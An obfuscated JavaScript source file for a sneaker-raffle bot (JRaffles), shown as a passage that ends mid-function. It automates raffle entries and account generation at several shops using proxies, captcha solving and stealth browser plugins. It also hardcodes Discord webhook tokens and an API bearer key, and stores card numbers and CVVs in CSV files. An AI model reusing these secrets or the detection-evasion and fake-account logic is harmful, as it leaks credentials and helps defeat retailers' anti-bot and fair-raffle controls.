const { EmbedBuilder: _0x58ddf4 } = require('discord.js');
var _0x42f946 = require('exe');
const { execFile: _0x19bbf1 } = require('child_process'), _0x149082 = require('puppeteer-extra'), _0x3fe2cb = require('puppeteer-extra-plugin-recaptcha'), _0x6d9f88 = require('puppeteer-extra-plugin-stealth'), _0x3e6680 = require('chalk'), _0x757e32 = require('node-bash-title'), _0x45be1e = require('fs'), _0x3d7745 = require('axios'), _0x8490e = require('papaparse');
var _0x171eca = require('random-name');
const _0x47e84e = require('request');
var _0x205687 = require('prompt');
const _0x3c0aa5 = _0x47e84e['jar']();
var _0x2cde8d = {};
const _0x828916 = '1067398661929181186/wvxr1d4nwFDFE-hAKBisU_mVWLloqatitfWvCqqIv38EUYiJMm_Pr3VKsuLsUBKN3PPj', _0x54ba49 = '1067398856721051719/2gS-h641y_RoqR-KZ5aOcrnDfvvXNQIz4uQv8eA8A5_nsRSJlaCaStreLwCu5lmUjO4H', _0x20bab9 = '1068515411877957743/t_TXlLhYbeQmPL19hyGeNqi1G0KPT8KCBYOVOcryGMvXPfIUBEpNZRBCC1j7OFRej4A6', _0x556ccd = '1068519704525807616/luGgvM1ZbR7g1zM5-10y5yceL2OGVCjrlkB6XxQL-hdoHUJ6hwSVAn6vVNyieHWLqPHE', _0x1be364 = '1070657276525940746/GSfXwIxjuRjwmP3sTDw73M4V2P5OJqMFgZyECtpBwFmtXGINvj1xFsVsZ2KwGBpJNHpn', _0x1faccc = '1072865476457287711/EePVQu0bb06IdHG3FfG7M-JDaE-38prupCPoCqaduP6mG_tsshUSaKidyfyVx0YgNC7e';
var _0x4e1ddc = 'https://discord.com/api/webhooks/', _0x844abe = '' + _0x4e1ddc + _0x20bab9, _0x201dd3 = '' + _0x4e1ddc + _0x556ccd, _0x1bd5ed = '' + _0x4e1ddc + _0x828916, _0x344612 = '' + _0x4e1ddc + _0x54ba49, _0x5bae61 = '' + _0x4e1ddc + _0x1be364, _0x4f1207 = '' + _0x4e1ddc + _0x1faccc;
const _0x43f956 = JSON['parse'](_0x45be1e['readFileSync']('../package.json', 'utf-8')), _0x582dcf = _0x43f956['version'];
var _0x10012e, _0x598b83, _0xfbef17, _0x4c97f1, _0x347773, _0x23aafa, _0xf76913, _0x20e83a;
const _0x2877fe = 'pk_7R7rRwMpveiR8OufEx9xIDMdU8Y95GgvGLF59wWRqklMwhXdpDnh5sN2KfaPHjEe';
let _0x111a5a = ![];
const _0x2e480f = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', _0x36f424 = '0123456789';
var _0x2a9c50 = _0x2e480f['split']('');
const _0x10d890 = require('auto-git-update'), { PageEmittedEvents: _0x2f21ec } = require('puppeteer'), { getRandomValues: _0x338d3f } = require('crypto'), { resolve: _0x52a31c } = require('path'), { Console: _0x272cfb } = require('console'), _0x5ededf = {
    'repository': 'https://github.com/Jarno97/JRafflesBot',
    'branch': 'main',
    'fromReleases': ![],
    'tempLocation': 'C:/temp/jraffles',
    'ignoreFiles': [
        'settings.json',
        'proxies.txt',
        'tasks/maha.csv',
        'tasks/footshop.csv',
        'tasks/afew.csv',
        'tasks/oqium.csv',
        'tasks/patta.csv',
        'accounts/patta.csv',
        'tasks/kickz.csv',
        'accounts/kickz-verified.csv',
        'accounts/kickz-unverified.csv'
    ]
}, _0x53fd7a = new _0x10d890(_0x5ededf);
async function _0x19de76() {
    _0x347773 = _0x45be1e['readdirSync']('../proxies'), _0x4c97f1 = _0x45be1e['readdirSync']('../tasks'), !_0x45be1e['existsSync']('../accounts/fenom.csv') && _0x45be1e['writeFileSync']('../accounts/fenom.csv', 'Email,Password\x0a'), !_0x45be1e['existsSync']('../accounts/bstn.csv') && _0x45be1e['writeFileSync']('../accounts/bstn.csv', 'Email,Password\x0a'), !_0x45be1e['existsSync']('../failed-tasks.csv') && _0x45be1e['writeFileSync']('../failed-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), !_0x45be1e['existsSync']('../successful-tasks.csv') && _0x45be1e['writeFileSync']('../successful-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), _0x2cde8d = JSON['parse'](_0x45be1e['readFileSync']('../settings.json', 'utf-8')), !_0x2cde8d['delay'] && (_0x2cde8d['delay'] = 0x2710, _0x45be1e['writeFileSync']('../settings.json', JSON['stringify'](_0x2cde8d))), !_0x2cde8d['captchaKey'] && (_0x2cde8d['captchaKey'] = '', _0x45be1e['writeFileSync']('../settings.json', JSON['stringify'](_0x2cde8d))), !_0x2cde8d['useRandomProxy'] && (_0x2cde8d['useRandomProxy'] = !![], _0x45be1e['writeFileSync']('../settings.json', JSON['stringify'](_0x2cde8d))), !_0x2cde8d['webhook'] && (_0x2cde8d['webhook'] = '', _0x45be1e['writeFileSync']('../settings.json', JSON['stringify'](_0x2cde8d))), _0x2cde8d['MahaDelay'] = _0x2cde8d['delay'], _0x4e1ddc = _0x2cde8d['webhook'], _0x23aafa = _0x2cde8d['licenseKey'];
}
let _0x4c772a, _0xa9c228 = [], _0x14c5ac;
const _0x29ac01 = _0xdd030e => new Promise(_0x12ff33 => setTimeout(_0x12ff33, _0xdd030e));
function _0x368412(_0x310aec, _0x389ac5) {
    return Math['floor'](Math['random']() * (_0x389ac5 - _0x310aec + 0x1) + _0x310aec);
}
async function _0x3bc12f(_0x4a0549) {
    return _0x3d7745['get']('https://api.hyper.co/v4/licenses/' + _0x4a0549, { 'headers': { 'Authorization': 'Bearer\x20' + _0x2877fe } })['then'](_0x4d4cb9 => _0x4d4cb9['data'])['catch'](() => null);
}
;
async function _0xfc23da(_0x919c77) {
    console['clear']();
    if (_0x919c77 == 'AWGH-0N92-JE6S-HOHU') {
        console['log']('Please\x20paste\x20your\x20key\x20here:');
        var _0x1e829d = await _0x205687['get']('License');
        if (_0x1e829d['License'] == 'AWGH-0N92-JE6S-HOHU')
            return console['log']('Error\x20please\x20use\x20the\x20key\x20on\x20the\x20JRaffles\x20dashboard'), await _0x29ac01(0xbb8), _0xfc23da(_0x919c77);
        _0x919c77 = _0x1e829d['License'], _0x2cde8d['licenseKey'] = _0x919c77, _0x23aafa = _0x919c77, _0x45be1e['writeFileSync']('../settings.json', JSON['stringify'](_0x2cde8d));
    }
    console['log']('Checking\x20license\x20' + _0x23aafa + '...'), await _0x29ac01(0x320);
    const _0x45b663 = await _0x3bc12f(_0x919c77);
    _0xf76913 = JSON['stringify'](_0x45b663['user']['discord']['username'])['substring'](0x1)['slice'](0x0, -0x1), _0x20e83a = JSON['stringify'](_0x45b663['user']['discord']['avatar'])['substring'](0x1)['slice'](0x0, -0x1);
    if (!_0x45b663)
        return console['log']('License\x20not\x20found');
    if (!_0x45b663['user'])
        return console['log']('License\x20not\x20bound');
    return _0x45b663['status'] === 'active' ? (console['log']('License\x20is\x20good\x20to\x20go!'), _0x111a5a = !![]) : (console['log']('Could\x20not\x20find\x20license..'), _0x111a5a = ![]);
}
async function _0x5e856a() {
    var _0x50313e = await _0x205687['get']('Module');
    return console['clear'](), _0x50313e['Module'];
}
;
async function _0x2c9d54() {
    var _0x1d8663 = await _0x205687['get']('Setting');
    return console['clear'](), _0x1d8663['Setting'];
}
async function _0x25bb74() {
    console['clear'](), console['log']('Choose\x20A\x20File\x20to\x20Run\x20\x0a');
    for (var _0x4f6bce = 0x0; _0x4f6bce < _0x4c97f1['length']; _0x4f6bce++) {
        console['log']('\x20(' + _0x4f6bce + ')\x20' + _0x4c97f1[_0x4f6bce]);
    }
    console['log']('');
    var _0x25f4b1 = await _0x205687['get']('Task');
    if (_0x25f4b1['Task'] > _0x4c97f1['length'] - 0x1 || isNaN(_0x25f4b1['Task']) == !![])
        return console['log']('Invalid\x20selection'), await _0x29ac01(0x3e8), _0x25bb74();
    var _0x4ddc6a = _0x45be1e['readFileSync']('../tasks/' + _0x4c97f1[_0x25f4b1['Task']], 'utf-8');
    return _0xfbef17 = _0x8490e['parse'](_0x4ddc6a, { 'header': !![] })['data'], console['clear'](), console['log']('Running\x20' + _0x3e6680['blue'](_0x4c97f1[_0x25f4b1['Task']])), _0x10012e = _0x4c97f1[_0x25f4b1['Task']], _0xfbef17;
}
async function _0x115f3f() {
    console['clear'](), console['log']('Choose\x20Proxies\x20to\x20Use\x20\x0a');
    for (var _0x33d654 = 0x0; _0x33d654 < _0x347773['length']; _0x33d654++) {
        console['log']('\x20(' + _0x33d654 + ')\x20' + _0x347773[_0x33d654]);
    }
    console['log']('');
    var _0x59f3a5 = await _0x205687['get']('Proxies');
    if (_0x59f3a5['Proxies'] > _0x347773['length'] - 0x1 || isNaN(_0x59f3a5['Proxies']) == !![])
        return console['log']('Invalid\x20selection'), await _0x29ac01(0x3e8), _0x115f3f();
    var _0x540ab7 = _0x45be1e['readFileSync']('../proxies/' + _0x347773[_0x59f3a5['Proxies']], 'utf-8')['split']('\x0a');
    let _0x327941 = _0x540ab7['map']((_0x4c8d8a, _0x25d5af) => {
        sanatizeProxy = _0x4c8d8a['replace']('\x0d', '');
        if (_0x540ab7[_0x25d5af + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x598b83 = _0x347773[_0x59f3a5['Proxies']], console['clear'](), _0x327941;
}
async function _0x225ec6() {
    var _0xd44a31 = await _0x205687['get']('Value');
    return console['clear'](), _0xd44a31['Value'];
}
async function _0x3f881c(_0x335fc8) {
    console['clear'](), console['log']('What\x20would\x20you\x20like\x20to\x20do?\x20\x0a');
    for (var _0x4242d9 = 0x0; _0x4242d9 < _0x335fc8['length']; _0x4242d9++) {
        console['log']('\x20(' + _0x4242d9 + ')\x20[' + _0x335fc8[_0x4242d9]['name'] + ']');
    }
    ;
    console['log']('');
    var _0x3ffd16 = await _0x205687['get']('Module');
    return _0x3ffd16['Module'];
}
async function _0x1d0c4f() {
    var _0x566816 = await _0x205687['get']('Password');
    return console['clear'](), _0x566816['Password'];
}
;
async function _0x2a3ba6() {
    var _0x1a213d = await _0x205687['get']('Links');
    return _0x1a213d['Links'];
}
;
async function _0x59b006() {
    console['log']('Choose\x20a\x20Raffle\x20to\x20enter:\x20\x0a');
    for (var _0x42a68e = 0x0; _0x42a68e < _0xa9c228['length']; _0x42a68e++) {
        console['log']('\x20(' + _0x42a68e + ')\x20' + _0xa9c228[_0x42a68e]);
    }
    ;
    console['log']();
    let _0x49f9c4 = await _0x205687['get']('Product');
    return console['clear'](), _0x49f9c4['Product'];
}
;
function _0x91a29b() {
    var _0x3ce18d = new Date(Date['now']())['toLocaleTimeString']();
    return _0x3ce18d;
}
;
function _0x2ec97e() {
    var _0x45f45b = new Date(Date['now']())['toLocaleString']();
    return _0x45f45b['replace'](',', '');
}
const _0x7d2206 = [
    {
        'name': 'AFEW\x20Store',
        'modules': [{
            'name': 'AFEW\x20Raffle\x20Entries',
            'store': 'AFEW',
            'logo': 'https://d19kzigy6tpscu.cloudfront.net/media/CACHE/images/logo_thumbnail/afew_logo_100x100_1647428869.png'
        }]
    },
    {
        'name': 'BSTN',
        'modules': [
            {
                'name': 'BSTN\x20Account\x20Generator',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png'
            },
            {
                'name': 'BSTN\x20Account\x20Verifier',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png'
            },
            {
                'name': 'BSTN\x20Raffle\x20Entries',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png'
            }
        ]
    },
    {
        'name': 'FENOM',
        'modules': [
            {
                'name': 'FENOM\x20Account\x20Generator',
                'store': 'FENOM',
                'logo': 'https://consumersiteimages.trustpilot.net/business-units/5de8db15496f380001d51371-198x149-1x.jpg'
            },
            {
                'name': 'FENOM\x20Raffle\x20Entries',
                'store': 'FENOM',
                'logo': 'https://consumersiteimages.trustpilot.net/business-units/5de8db15496f380001d51371-198x149-1x.jpg'
            }
        ]
    },
    {
        'name': 'FOOTSHOP',
        'modules': [{
            'name': 'FOOTSHOP\x20Raffle\x20Entries',
            'store': 'Footshop',
            'logo': 'https://images.easyfundraising.org.uk/retailer/cropped/logo-footshop-1615542072.png'
        }]
    },
    {
        'name': 'JD',
        'modules': [{
            'name': 'JD\x20Raffle\x20Entries',
            'store': 'JD',
            'logo': 'https://upload.wikimedia.org/wikipedia/en/thumb/d/d8/JD_Sports_logo.svg/2048px-JD_Sports_logo.svg.png'
        }]
    },
    {
        'name': 'KICKZ',
        'modules': [
            {
                'name': 'KICKZ\x20Account\x20Generator',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b'
            },
            {
                'name': 'KICKZ\x20Raffle\x20Entries',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b'
            }
        ]
    },
    {
        'name': 'MAHA\x20Amsterdam',
        'modules': [
            {
                'name': 'MAHA\x20Raffle\x20Entries',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=THxSew',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'RvxrAV',
                            'custom_source': 'Air\x20Jordan\x201\x20High\x20OG\x20\x27White\x20Cement\x27',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'WQN5XR',
                                '$consent_form_version': 0x7f7254,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                }
            },
            {
                'name': 'MAHA\x20Raffle\x20Verification',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                }
            }
        ]
    },
    {
        'name': 'OQIUM\x20Store',
        'modules': [
            {
                'name': 'OQIUM\x20Raffle\x20Entries',
                'store': 'OQIUM',
                'logo': 'https://s3-eu-west-1.amazonaws.com/tpd/logos/5e8e742e8f9bb4000118f0bc/0x0.png',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=R3sbqs',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'SQ43yf',
                            'custom_source': 'DZ5485-052',
                            'email': '',
                            'properties': {
                                '$first_name': '',
                                '$last_name': '',
                                '$phone_number': '',
                                'Size': '',
                                'Instagram\x20Account': '',
                                '$address1': '',
                                '$zip': '',
                                '$city': '',
                                '$country': '',
                                'Accepts\x20Marketing': ['NoByRaffle'],
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'WLQk7t',
                                '$consent_form_version': 0x7f71d6,
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://oqium.com',
                    'referer': 'https://oqium.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                }
            },
            {
                'name': 'OQIUM\x20Raffle\x20Verification',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                }
            }
        ]
    },
    {
        'name': 'PATTA',
        'modules': [
            {
                'name': 'PATTA\x20Account\x20Generator',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562'
            },
            {
                'name': 'PATTA\x20Raffle\x20Entries',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562'
            }
        ]
    },
    {
        'name': 'SLAM\x20JAM',
        'modules': [
            {
                'name': 'SLAM\x20JAM\x20Account\x20Generator',
                'store': 'SLAM\x20JAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505'
            },
            {
                'name': 'SLAM\x20JAM\x20Raffle\x20Entries',
                'store': 'SLAM\x20JAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505'
            }
        ]
    },
    { 'name': 'Paypal\x20Verification' },
    { 'name': 'Change\x20Settings' },
    { 'name': 'Reload\x20Settings' }
];
async function _0x31fc49(_0x4555fd, _0x3356a7) {
    let _0x1441ad = { 'headers': { 'content-type': 'application/json' } };
    if (_0x582dcf != 'devkey') {
        await _0x3d7745['post'](_0x4555fd, _0x3356a7, _0x1441ad);
        return;
    }
    return console['log']('devkey\x20settings\x20enabled,\x20not\x20sending\x20webhooks');
}
;
async function _0x2463d6(_0x1aa6f8, _0x34fa3d, _0x193dcd, _0x1a8941, _0x24e11e) {
    if (!_0x1a8941 && _0x193dcd == 'dev') {
        var _0x25db62 = new _0x58ddf4()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Raffle\x20Entry')['setAuthor']({
            'name': 'JRaffles',
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
            'url': 'https://twitter.com/JRaffles_'
        })['setThumbnail'](_0x34fa3d['logo'])['addFields']({
            'name': 'Store',
            'value': '' + _0x34fa3d['store'],
            'inline': !![]
        })['addFields']({
            'name': 'Size',
            'value': '' + _0x1aa6f8['Size'],
            'inline': !![]
        })['addFields']({
            'name': 'Delay',
            'value': '' + _0x2cde8d['delay'],
            'inline': !![]
        })['addFields']({
            'name': 'User',
            'value': '' + _0xf76913,
            'inline': !![]
        })['addFields']({
            'name': 'URL',
            'value': '' + _0x1aa6f8['Url'],
            'inline': !![]
        })['setTimestamp']()['setFooter']({
            'text': 'JRaffles\x20v' + _0x582dcf,
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
        });
        return _0x25db62['data'];
    } else {
        if (_0x1a8941 && _0x193dcd == 'dev') {
            var _0x25db62 = new _0x58ddf4()['setColor'](0xc0d6d6)['setTitle']('Failed\x20Raffle\x20Entry')['setAuthor']({
                'name': 'JRaffles',
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                'url': 'https://twitter.com/JRaffles_'
            })['setThumbnail'](_0x34fa3d['logo'])['addFields']({
                'name': 'User',
                'value': '' + _0xf76913,
                'inline': !![]
            }, {
                'name': 'Store',
                'value': '' + _0x34fa3d['store'],
                'inline': !![]
            }, {
                'name': 'Size',
                'value': '' + _0x1aa6f8['Size'],
                'inline': !![]
            }, {
                'name': 'Delay',
                'value': '' + _0x2cde8d['delay'],
                'inline': !![]
            })['addFields']({
                'name': 'ERROR',
                'value': '' + _0x24e11e,
                'inline': !![]
            })['addFields']({
                'name': 'URL',
                'value': '' + _0x1aa6f8['Url']
            })['setTimestamp']()['setFooter']({
                'text': 'JRaffles\x20v' + _0x582dcf,
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
            });
            return _0x25db62['data'];
        } else {
            if (_0x193dcd == 'pub') {
                var _0x25db62 = new _0x58ddf4()['setColor'](0xc0d6d6)['setTitle']('Succesful\x20Raffle\x20Entry')['setAuthor']({
                    'name': 'JRaffles',
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                    'url': 'https://twitter.com/JRaffles_'
                })['setThumbnail'](_0x34fa3d['logo'])['addFields']({
                    'name': 'Store',
                    'value': '' + _0x34fa3d['store'],
                    'inline': !![]
                }, {
                    'name': 'Size',
                    'value': '' + _0x1aa6f8['Size'],
                    'inline': !![]
                }, {
                    'name': 'Delay',
                    'value': '' + _0x2cde8d['delay'],
                    'inline': !![]
                })['addFields']({
                    'name': 'URL',
                    'value': '||' + _0x1aa6f8['Url'] + '||'
                })['setTimestamp']()['setFooter']({
                    'text': 'JRaffles\x20v' + _0x582dcf,
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                });
                return _0x25db62['data'];
            } else {
                if (_0x193dcd == 'acc' && !_0x1a8941) {
                    var _0x25db62 = new _0x58ddf4()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generated')['setAuthor']({
                        'name': 'JRaffles',
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                        'url': 'https://twitter.com/JRaffles_'
                    })['setThumbnail'](_0x34fa3d['logo'])['addFields']({
                        'name': 'User',
                        'value': '' + _0xf76913,
                        'inline': !![]
                    }, {
                        'name': 'Store',
                        'value': '' + _0x34fa3d['store'],
                        'inline': !![]
                    }, {
                        'name': 'Delay',
                        'value': '' + _0x2cde8d['delay'],
                        'inline': !![]
                    })['setTimestamp']()['setFooter']({
                        'text': 'JRaffles\x20v' + _0x582dcf,
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                    });
                    return _0x25db62['data'];
                } else {
                    if (_0x193dcd == 'acc' && _0x1a8941) {
                        var _0x25db62 = new _0x58ddf4()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generation\x20Failed')['setAuthor']({
                            'name': 'JRaffles',
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                            'url': 'https://twitter.com/JRaffles_'
                        })['setThumbnail'](_0x34fa3d['logo'])['addFields']({
                            'name': 'User',
                            'value': '' + _0xf76913,
                            'inline': !![]
                        }, {
                            'name': 'Error',
                            'value': '' + _0x24e11e,
                            'inline': !![]
                        }, {
                            'name': 'Store',
                            'value': '' + _0x34fa3d['store'],
                            'inline': !![]
                        }, {
                            'name': 'Delay',
                            'value': '' + _0x2cde8d['delay'],
                            'inline': !![]
                        })['setTimestamp']()['setFooter']({
                            'text': 'JRaffles\x20v' + _0x582dcf,
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                        });
                        return _0x25db62['data'];
                    } else {
                        if (_0x193dcd == 'open') {
                            var _0x25db62 = new _0x58ddf4()['setColor'](0xc0d6d6)['setTitle']('User\x20Opened\x20JRaffles')['setAuthor']({
                                'name': 'JRaffles',
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                'url': 'https://twitter.com/JRaffles_'
                            })['setThumbnail'](_0x20e83a)['addFields']({
                                'name': 'User',
                                'value': '' + _0xf76913,
                                'inline': !![]
                            })['setTimestamp']()['setFooter']({
                                'text': 'JRaffles\x20v' + _0x582dcf,
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                            });
                            return _0x25db62['data'];
                        } else {
                            if (!_0x1a8941 && _0x193dcd == 'ver') {
                                var _0x25db62 = new _0x58ddf4()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Verification')['setAuthor']({
                                    'name': 'JRaffles',
                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                    'url': 'https://twitter.com/JRaffles_'
